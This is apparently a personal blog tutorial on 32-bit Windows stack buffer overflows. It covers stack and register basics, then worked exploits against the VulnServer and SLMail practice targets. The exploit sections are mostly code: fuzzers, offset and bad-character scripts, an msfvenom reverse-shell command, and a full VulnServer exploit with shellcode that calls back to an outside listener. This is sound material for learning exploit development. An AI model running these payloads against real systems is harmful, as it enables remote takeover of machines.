---
title: Simple Win32 Buffer Overflow - EIP Overwrite
tags: [Buffer Overfow,Exploit Development,Windows,OSCP]
description: I have recently embarked on the task of understanding Buffer Overflows beyond simple Stack Overflows and I figured the best way to go about it was to go back to the start, recover Stack/Assembly principles. Quickly recover simple Stack Overflows and then begin writing a blog post for each relevant area that I want to learn in greater detail.
thumbnail: https://www.gravsoft.pl/images/products/big/Immunity-Debugger-222-GRAVSOFT-PL-1.png
published: true
---





# [](#header-1)Introduction



I have recently embarked on the task of understanding Buffer Overflows beyond simple Stack Overflows and I figured the best way to go about it was to go back to the start, recover Stack/Assembly principles. Quickly recover simple Stack Overflows and then begin writing a blog post for each relevant area that I want to learn in greater detail.  

Exploit Development/BOF truthfully does not interest me a lot but I wanna learn it because why not :) - My plan is to focus on Win32 overflows for the time being and then get my head around 64bit side of things when working on tougher exercises etc. 

Truthfully everything talked about in this article is very out-dated and no longer relevant due to certain mitigations like ASLR/DEP and exploit development has changed a lot, but to learn the current stuff you have to learn the old stuff.



This is my planned path at current

- Simple EIP Overflow
- SEH Overflow / Egghunting
- DEP/ASLR Bypass/Bruteforce
- Heap Overflows



In this article I will talk about 



https://windowsexploit.com/blog/2017/1/29/learning-strategies-effective-techniques-to-learn-windows-exploitation

### [](#header-3) VM Setup

I won't go into much detail here but basically I have a Windows 7 x64 VM Setup within VMWare Workstation Pro with the below installed/disabled



- Windows 7 x64 Pro **SP1**
- Immunity Debugger
  - Mona.py Installed
- IDA Free
- **ASLR** Disabled
  - Use **EMET GUI**
- **DEP** Disabled
  - `bcdedit /set {current} nx AlwaysOff`
- Visual Studio (Optional)




### [](#header-3) Basic Assembly Instructions & Examples

https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames



- **CALL** - Call's a function and pushes **return-address** onto the stack
- **PUSH EBP** - Pushes value of EBP onto top of Stack (Bottom right in immunity)
- **POP EBX** - POP's value at top of the stack into **EBX Register**
- **MOV EBP,ESP** - Moves the value of **ESP** into **EBP**
  - ​	Remember destination always comes before source with Assembly.
- **TEST EAX,81010100** - Verifies the value of EAX
- **ADD ESP, 4** - Add 4 onto the **ESP** Value
- **SUB ESP, 4** - Subtracts 4 from the ESP Value
- **MOV DWORD PTR SS:[ESP+10], ECX** - Moves value of **ECX** 10 places above **ESP pointer**
- **LEAVE** - Clears existing **stack-frame** in preparation for *returning* to previous **EBP**



Worth mentioning with **Intel Syntax (Win32)** destination comes before source, so in this case we would move the value of the ESP register into EBP - Really the current `ESP` register, aka the top of the stack would now represent the bottom (`EBP`) of our stack frame. 

Whereas with **AT&T Syntax** it is the opposite! So confusing I know but it is what it is... - Now what uses **AT&T Syntax** well *Unix Assemblers* do and that includes the *GNU Assembler*


### [](#header-3) Memory Layout



Memory management and layout is at the core of all operating systems, while layout may be different across operating systems and different architectures, however as previously mentioned throughout this post I will only be covering **32-bit x86**, I will also be sticking to **Windows** but may lean into Linux at some points depending on screenshots & resources.

Now anytime a process is created/spawned within Windows it will run within it's own *memory sandbox*, which is commonly known as a **virtual address space** & as we are sticking to **Win32** this *address space* will always be a *4GB Block*. These address spaces are managed and controlled by the kernel.



Now memory layout is slightly different across 32bit and 64bit but for the time being I will just touch on 32bit, the memory is laid out in the following order



- KERNEL - 0xfff(111)
- STACK
- HEAP
- DATA
- TEXT - 0x000 (000)



Now as you can see that memory starts from the top down and is organized from higher address to lower address, I was going to create a image representing this but there are numerous out there which will save me the time and I will credit the article below :) 


<p align="center">
<img src="https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb.png">
</p>


*Credit: https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/*

<p align="center">
<img src="https://www.corelan.be/wp-content/uploads/2010/08/image_thumb3.png">
</p>



Now as you can see in the photo above you have a **Unused Memory** area, now when the Stack "grows" it will *increase* downwards and likewise when the heap "grows" it will *increase* upwards.  So it's worth noting that the stack grows from high memory locations 0xfff -> downwards to -> 0x000.



**Think about a stack of books or stack of paper, you can only add to the top of the pile and you can only remove from the top of the pile** **and POP would remove a book and PUSH would add a book to the stack.**



Now what's the difference between **Stack** & **Heap**? - Basically the stack overs a LIFO (**Last-In-First-Out**) process in which when a new function is called a **stack frame** is reserved (pushed) onto the top of the stack for local variables and general program data (buffers etc), return addresses etc **(EIP)**. Whereas the **Heap** is set aside for Dynamic allocation, unlike the stack there is no enforced pattern for the allocation or deallocation of memory blocks, you can allocate any block and deallocate any block at any any position, any time.



So now we understand how memory is laid out we should probably talk about how the Stack is laid out and talk about registers.



![img](https://i.imgur.com/A84R4lE.png)



### [](#header-3) What is the Stack?



[https://manybutfinite.com/post/journey-to-the-stack/#targetText=The%20second%20register%20tracking%20the,function%20call%20begins%20or%20ends.](https://manybutfinite.com/post/journey-to-the-stack/#targetText=The second register tracking the,function call begins or ends.)

So basically the **Stack** is used for storing local variables, misc data and keeping track of *functions* running within a program. Now when a function is created/ran it will create a **stack frame** within the program and said *frame* will store all the local variables for the relevant *function*. Typically the data/variables being pushed onto the stack aren't highly important and are disposed off once the functions has returned and any data that would have to survive a *function returning* would typically be allocated in dynamically accessible memory such as the **Heap**




### [](#header-4) Stack Frames



Now when a function is called within our program let's say `substract()` - a **stack frame** will be created and **pushed** onto the *top* of the **stack** typically with the below assembly instructions



```assembly
push ebp
mov ebp,esp
sub esp, %n

where %n is the space in bytes allocated for local variables
```





Now when a *function* is **called** and a **stack frame** is created we will also push the **local variables** & any **arguments** passed to the program by it's caller onto the stack. This **stack frame** will also contain other information such as **return address** which will allow you to return from the *function* to the caller safely.



Once our *function* has finished running & doing it's thing and we issue a `RETN` *aka* *return* the  **stack frame** will be destroyed.  



This is a really nice image from [https://manybutfinite.com](ManyButFinite)



<p align="center">
<img src="https://manybutfinite.com/img/stack/stackIntro.png">
</p>



Now here we can see 3 types of **Registers**

- ESP - Extended Stack Pointer
  - *Always* points to the top of the stack and represents the most recent item **PUSHED**/**POPPED** onto the stack
- EBP - Extended Base Pointer
  - aka *base pointer* or *frame pointer* - It points to a fixed location within the *stack frame* of the function *currently running* - i/e, EBP represents the bottom of the *active* **stack frame**. So this really means that the **EBP** register will only change when a new function is *called* or *returned* - This is why you commonly see each items in the stack addresses with an offset from the **EBP** register
    - For ex. `MOV EAX,DWORD PRT SS:[EBP+8]`
    - EBP - 4
- EAX - Accumulator 




The below example is ripped from manybutfinite but was one of the first examples that made me actually think to myself *I'm finally understanding this shit* - This is a linux example of a **stack frame** being created on a *live stack* however the principles remain the same. 


<p align="center">
<img src="https://manybutfinite.com/img/stack/mainProlog.png">
</p>



*Source: https://manybutfinite.com*



The above is what we call the **function prologue** which is normally the same for all architectures what normally looks the same always - As you can see when the function is *called* the **return-address** is pushed to the stack during the `CALL` instruction



I don't want to put the whole call sequence as the link above really does explain it the best, and you can find the full call sequence here.

https://manybutfinite.com/img/stack/callSequence.png



### [](#header-3) Registers



So what are registers? A register is nothing more than a high-speed memory area that's built onto the CPU chip, it's super fast. 



**Types of Registers for 32bit**



-  **EIP** – Extended Instruction Pointer – Address of the Next Instruction
-  **ESP** - Extended Stack Pointer
   - *Always* points to the top of the stack and represents the most recent item **PUSHED**/**POPPED** onto the stack
- **EBP** - Extended Base Pointer
   - aka *base pointer* or *frame pointer* - It points to a fixed location within the *stack frame* of the function *currently running* - i/e, EBP represents the bottom of the *active* **stack frame**. So this really means that the **EBP** register will only change when a new function is *called* or *returned* - This is why you commonly see each items in the stack addresses with an offset from the **EBP** register
     - For ex. `MOV EAX,DWORD PRT SS:[EBP+8]`
     - EBP - 4
- **EAX** - Accumulator
-  Used for performing basic calculations, store returning values from *function calls* also works as a general-purpose register facilitating add/subtract etc.
- **EBX** – Base Register.
- **ECX** – “counter” normally used to hold a loop index.
- **EDX** – Data Register.
- **ESI/EDI** – Used by memory transfer instructions.



***



# [](#header-1) Examples



## [](#header-2) VulnServer



Now anyone who has been remotely interested in InfoSec in well forever... has probably heard of VulnServer but it's a great starting point to Win32, basically it is a Multi-Threaded TCP server that listen for client connections on TCP Port 9999, (can be changed)

*https://github.com/stephenbradshaw/vulnserver*


### [](#header-3) Fuzzing & Overrunning EIP

Let's begin by fuzzing with the below script

```python
#!/usr/bin/python
import socket
import sys

buffer=["A"]
counter=100

while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200


for string in buffer:
	print "Fuzzing vulnserver with %s bytes"  %len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',9999))
	s.send(('TRUN /.:/' + string))
	s.close()
```

This will connect to Port `9999` and fuzz Port `9999` with the letter `A` incrementing by 200 each pass. 

```
Fuzzing vulnserver with 1 bytes
Fuzzing vulnserver with 100 bytes
Fuzzing vulnserver with 300 bytes
Fuzzing vulnserver with 500 bytes
Fuzzing vulnserver with 700 bytes
Fuzzing vulnserver with 900 bytes
Fuzzing vulnserver with 1100 bytes
Fuzzing vulnserver with 1300 bytes
Fuzzing vulnserver with 1500 bytes
Fuzzing vulnserver with 1700 bytes
Fuzzing vulnserver with 1900 bytes
Fuzzing vulnserver with 2100 bytes
Fuzzing vulnserver with 2300 bytes
Fuzzing vulnserver with 2500 bytes
.....
```



Now providing we are attached to `VulnServer` within `Immunity` we will see that `EIP` was overwritten with `41414141` which is the Hex code for `A` - Therefore we know that our input has overwritten EIP, now if we find the offset where we overrun our buffer we can generate specific code that fills the buffer + our return address. 

To do this we have to generate a Unique pattern, which I will cover below.


### [](#header-3) Finding the Offset



Now as I mentioned above we were able to overrun EIP and now we have to find out exactly how many bytes or how many `A's` it takes to fill the buffer and spill over into the return address (`EIP`)

There are a couple ways to do this, with metasploit or mona, I personally prefer mona but I would like to show both methods.



**Metasploit**

```bash
m0chan@kali:/> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6000

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6A
.....
```

This will generate a large pattern of random letters and characters which we can send with our fuzzing script from above instead of sending a long string of A's, See below script.



```python
#!/usr/bin/python
import socket
import sys

buffer="Aa0Aa1Aa2Aa...."

try:
	print "Fuzzing vulnserver with pattern"
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',9999))
	s.send(('TRUN /.:/' + buffer))
	print "finished fuzzing with pattern check immunity"
	s.close()
except:
	print "couldn't connect to server"
```



Now let's restart our VulnServer/Reattach and run this python script and see what we get in the EIP Value now. 

![img](https://i.imgur.com/rJsell6.png)



Now looking at the above we can see that we have an access violation when executing `386F4337` at the bottom left which corresponds to the value currently in the `EIP` register, this actually converts to `8oc7` in ASCII which is 4 bytes / 8 bits. 

**Ps: This value is actually backwards due to little-endian so it's real ASCII value is `7Co8`**

Also worth noting is the bottom left which displays the current content of the stack, as you can see it is filled with our pattern/junk. 



Now we can take out value `386F4337` and pass it too `pattern_offset.rb` like below

```bash
m0chan@kali:/> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337

[*] Exact match at offset 2003
```



Boom, now we know we overrun our buffer after 2003 bytes.  We can actually verify this by altering our `fuzzer.py` script to send `"A"*2003` + `"B"*4` - Then we will notice that the stack contains a whole bunch of A's (41414141) and our `EIP` contains a value of `42424242` which stands for 4 `B's` Great! We can now control the `EIP` register. 



Now before I move on to the next section about determining bad characters and what you should not send in your Buffer/EIP Override I just want to show how you can do the above with `mona` 



**Mona**



Mona is basically a third-party add-on for **Immunity** that allows you to integrate a wide range of python scripts/tools that greatly assists with the development of exploits.   

I won't cover the install of Mona as it is fairly trivial and the developer already has done a great job of documenting it. 



First let's generate a pattern similar to what we did with metasploits `pattern_create.rb` It is as simple as entering the below in the command box at the bottom of **Immunity**

`!mona pc 6000`

This will save it too a file called `pattern.txt` within Mona's working directory and will be the script used in our **Python** script like I talked about above. 

That cool thing about is that it outputs the pattern in various different formats, such as `ASCII` `HEX` AND `Javascript`



Same thing happens, we get a strange value in our `EIP` value after running the script and we can check the offset with the below command

`!mona po 386F4337`



![img](https://i.imgur.com/zUpymxd.png)



Perfect! Now we can move on to finding bad characters. 

****

### [](#header-3) Finding Bad Characters



*https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/*

Now depending on your architecture or program type there may be some form of bad characters that are not supported, for example the `null-byte` `\x00` which will terminate the running of a program, no good right? There are however many others which we must find and remove when generating our shellcode. 

Doing this is relatively simple as we can simple visit the website linked above, take the array of bad chars and send all those characters at once along with our buffer overflow and EIP overwrite and analyse the memory dump within Immunity and look for any bad characters.



First let's alter our fuzzer.py script to look something like this.

```python
#!/usr/bin/python
import socket
import sys

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#A = buffer overflows
#B = EIP placeholder
#badchars = well... no explanation needed

buffer = "A"*2003 + "B"*4 + badchars

try:
	print "Overriding vuln server EIP with BBBB + badchars"
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',9999))
	s.send(('TRUN /.:/' + buffer))
	print "finished fuzzing with bad chars test check immunity"
	s.close()
except:
	print "couldn't connect to server"
```



Let's send this through and check out Immunity. 



First right click the `ESP` Value within the **Registers** pane and choose `Follow in Dump`

 

![img](https://i.imgur.com/UWaZgtj.png)



As you can see we can see all the characters we sent through displaying at the bottom left which is good as VulnServer actually dosen't contain any bad characters, however I have included a image below that will show you what to expect when you see bad characters. 





![img](https://i.imgur.com/xGk7tS0.png)



If you look closely you can see characters that are almost like "null" icons, these are bad chars and what you should exclude with using when generating your shellcode with MSFVenom. Look at characters 4/5 on the first line within `ASCII` column.

***

### [](#header-3) Finding the Right Module



Great so now we know how many characters it takes to overrun our buffer, the offset where our `EIP` is overrun and also our bad characters - Let's begin piecing this together and crafting our final exploit. 

What we have to do now is find a module or existing assembly `JMP ESP` call to jump back to the start of our buffer in which there will be some a 



Let's first search for modules with mona

`!mona modules`



![img](https://i.imgur.com/kcq709F.png)



The objective here is to find a module with no ASLR & DEP enabled and also that contains no bad characters within the memory address. 

My first choice here is to use `essfunc.dll` as all mitigations are marked as `False` and does not contain any bad characters within it's memory address.



Now we need to find a `JMP ESP` / `FFE4` instruction within out specified module so we will run the below command

`!mona find –s “\xff\xe4” –m essfunc.dll `



![img](https://i.imgur.com/1nOxYAQ.png)



Now this gives us address `625011AF` which we will use as our **Return-Address**



So now instead of overwriting our `EIP` value with 4 x `B's` and instead replace it with `625011AF` **BACKWARDS**.  This is due to the way x86 architecture stores addresses as they use little endian.



After reverting our memory location it will look something like this `\xaf\x11\x50\x62`



Now let's change our `fuzzer.py` to send `"A" * 2003 + \xaf\x11\x50\x62` - This will actually run and just simple `JMP ESP` (Jump to the top of the Stack.) 



***



### [](#header-3) Generating Shellcode and Adding NOPS



Let's first generate some shellcode with msfvenom 

```bash
m0chan@kali:/> msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.25 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"

If you notice we specify -b and \x00 as it is the only bad character, if there were numerous bad characters then this is where we would specify them.
```



We will now be generated with our Shellcode but before we can add this to our exploit we must add some NOPS after the `EIP` value `\xaf\x11\x50\x62` 



Basically NOPS stand for No-Operation which means skip this memory location, we use them to add a little bit of padding around our exploit just in case a memory location changes, they are represented with `\x90` - In our case we will add 8 of them so our finally payload line will look something like

`buffer = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*8 + exploit`



Let's start a nc listener on `443` and and overview our final exploit and try run it.

![img](https://i.imgur.com/vaBpTk6.png)



Final Exploit

```python
#!/usr/bin/python
import socket
import sys

exploit = (
"\xdb\xcd\xd9\x74\x24\xf4\xbf\x5c\xe9\x83\x7b\x5a\x33\xc9\xb1"
"\x52\x31\x7a\x17\x83\xc2\x04\x03\x26\xfa\x61\x8e\x2a\x14\xe7"
"\x71\xd2\xe5\x88\xf8\x37\xd4\x88\x9f\x3c\x47\x39\xeb\x10\x64"
"\xb2\xb9\x80\xff\xb6\x15\xa7\x48\x7c\x40\x86\x49\x2d\xb0\x89"
"\xc9\x2c\xe5\x69\xf3\xfe\xf8\x68\x34\xe2\xf1\x38\xed\x68\xa7"
"\xac\x9a\x25\x74\x47\xd0\xa8\xfc\xb4\xa1\xcb\x2d\x6b\xb9\x95"
"\xed\x8a\x6e\xae\xa7\x94\x73\x8b\x7e\x2f\x47\x67\x81\xf9\x99"
"\x88\x2e\xc4\x15\x7b\x2e\x01\x91\x64\x45\x7b\xe1\x19\x5e\xb8"
"\x9b\xc5\xeb\x5a\x3b\x8d\x4c\x86\xbd\x42\x0a\x4d\xb1\x2f\x58"
"\x09\xd6\xae\x8d\x22\xe2\x3b\x30\xe4\x62\x7f\x17\x20\x2e\xdb"
"\x36\x71\x8a\x8a\x47\x61\x75\x72\xe2\xea\x98\x67\x9f\xb1\xf4"
"\x44\x92\x49\x05\xc3\xa5\x3a\x37\x4c\x1e\xd4\x7b\x05\xb8\x23"
"\x7b\x3c\x7c\xbb\x82\xbf\x7d\x92\x40\xeb\x2d\x8c\x61\x94\xa5"
"\x4c\x8d\x41\x69\x1c\x21\x3a\xca\xcc\x81\xea\xa2\x06\x0e\xd4"
"\xd3\x29\xc4\x7d\x79\xd0\x8f\x2d\x6e\xd0\x56\x46\x8d\xe4\x69"
"\x2d\x18\x02\x03\x41\x4d\x9d\xbc\xf8\xd4\x55\x5c\x04\xc3\x10"
"\x5e\x8e\xe0\xe5\x11\x67\x8c\xf5\xc6\x87\xdb\xa7\x41\x97\xf1"
"\xcf\x0e\x0a\x9e\x0f\x58\x37\x09\x58\x0d\x89\x40\x0c\xa3\xb0"
"\xfa\x32\x3e\x24\xc4\xf6\xe5\x95\xcb\xf7\x68\xa1\xef\xe7\xb4"
"\x2a\xb4\x53\x69\x7d\x62\x0d\xcf\xd7\xc4\xe7\x99\x84\x8e\x6f"
"\x5f\xe7\x10\xe9\x60\x22\xe7\x15\xd0\x9b\xbe\x2a\xdd\x4b\x37"
"\x53\x03\xec\xb8\x8e\x87\x0c\x5b\x1a\xf2\xa4\xc2\xcf\xbf\xa8"
"\xf4\x3a\x83\xd4\x76\xce\x7c\x23\x66\xbb\x79\x6f\x20\x50\xf0"
"\xe0\xc5\x56\xa7\x01\xcc")

#nops = "\x90"*8
#A = buffer overflows
#B = JMP ESP



buffer = "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*32 + exploit 

try:
	print "Overriding vuln server EIP with BBBB + badchars"
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',9999))
	s.send(('TRUN /.:/' + buffer))
	print "finished fuzzing with bad chars test check immunity"
	s.close()
except:
	print "couldn't connect to server"
```





## [](#header-2) SLMail



Similar to VulnServer, SLMail is a legacy piece of software that is sometimes used to teach Buffer Overflow as it has numerous vulnerabilties as well as a fairly simple **Stack-Overflow** to exploit

*https://slmail.software.informer.com/5.5/*




### [](#header-3) Fuzzing & Overrunning EIP



Let's begin by fuzzing with the below script

```python
#!/usr/bin/python
import socket
import sys

buffer=["A"]
counter=100

while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200


for string in buffer:
	print "Fuzzing PASS with %s bytes" %len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('bof.local',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()
```

This will connect to Port `110` aka **POP** and *fuzz* the PASS input with an incrementing string of `A's`

You may notice, this is the same script we use for **VulnServer** - Well it is, I mainly use nearly the same script for every single Stack-Overflow and you should too. Just create a *skeleton* script that really is one-size-fits-all.



Upon running this script we will notice it slowly increments `Fuzzing PASS with +200 bytes` each time - Before finally crashing at `2900 bytes` - It actually takes a little while due to how bad SLMail is ;) - Now we have crashed at `2900 Bytes` let's check out Immunity.



As we can see we have overwritten EIP with `41414141` which represents `4 x A` and we also have a lot a lot of `A's` visible on the **stack.**

![img](https://i.imgur.com/eQYWvC9.png)



Let's now proceed to finding the offset in which we overrun EIP so we can begin developing our exploit.





### [](#header-3) Finding the Offset



In the previous example for **VulnServer** we used a combination of Metasploit & Mona to show off how to carry out this part so I am going to stick purely to **mona** this time round purely down to personally preference. 



**Mona**



Let's first begin by creating a pattern with **mona**, now we know from our fuzzing that we only really need a pattern along the lines of 2900/300 bytes so let's generate that with the below command



````python
!mona pc 3000
````



This gives us a nice long not repeating string like below

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7......
```



**Fuzzing Pattern**



We can now use the below script to send our non-repeating string through instead of numerous A's



```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "patternhere"

try:
	print "\nSending evil buffer..."
	s.connect(('bof.local',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP"

```

![img](https://i.imgur.com/zmrKF3S.png)



Now we can see we have overwritten **EIP** with value `39694438`



Now let's check offset location with **mona** again

```python
!mona po 39694438
```



![img](https://i.imgur.com/GuWhpPz.png)



Bingo we overwrite our buffer after **2606 bytes** - Let's check for bad chars before bringing this all together. 





### [](#header-3) Finding Bad Characters





I won't go into the depths of bad characters and why we have to find them as I covered it in the **VulnServer** example but the long story short is we have to find any characters that our target software would render as *bad* so we can be sure to exclude them when generating shellcode or choosing a JMP instruction.



We can simple fuzz the program with the below script which will send all characters at once and we can analyse the memory dump for any *dead characters*



I typically use the below script.



```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*2606 + "B"*4+ badchars

try:
	print "\nSending evil buffer..."
	s.connect(('bof.local',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP"
```



Notice the line 

```python
buffer = "A"*2606 + "B"*4+ badchars
```

We have *filled* the buffer with 2606 A's, then overwritten the EIP value with `42424242` and we will put all the bad chars after. Also! Notice we have left out `\x00` as it will be evaluated as a nullbyte therefore terminating the string which we do not want for obvious reasons.



Let's send it through and check the memory dump.



Now checking the memory dump, unlike **VulnServer** which did not have any bad characters we actually have a couple this time round which is good for educational purposes.

As you can see on the fourth line down we follow this sequence



```hex
01 02 03 04 05 06 07 08 09 29
```

Everything is going fine until suddenly it goes from 09 to 29? What?! It should be 10 !! - This is a bad character. 



Now if we check our `badchars` array in our python script we can see that the 10th character is `x0a` - Now we remove `x0a` from our array and send bad chars through again see if we notice anything else.



Now checking again we can see that we jump straight from `0C`	 to `0E` missing out `0D` which means that `\x0d` is a bad character.



![img](https://i.imgur.com/YfkV3KW.png)



**Bad Char List**

```
\x0a
\x00
\x0d
```



Perfect! This is actually the last one so it wasn't too brutal this time round, I have saw exploits with 10+ bad characters, so it could be a lot worse. 





### [](#header-3) Finding The Right Module



Now, just like the previous sections of this example I won't be jumping deep into why we have to find a module here or the in's and outs of a `JMP ESP` instruction as I talked about it above and it should be fairly self-explanatory providing you understand **stack-frames** and basic stack and assembly layout/instructions



Once again I will use Mona here due to it's simplicity.



**Mona**



```python
!mona modules
```



What we're looking for here is a module/dll that was not built with DEP/ASLR. Looking at the screenshot below it would appear that `SLMFC.DLL` would be of use.



![img](https://i.imgur.com/9EylYmM.png)



Let's now use Mona to find a `JMP ESP` instruction that we can use for our **return address** which will therefore jump to our **NOPS** and slide straight into our shellcode/payload.

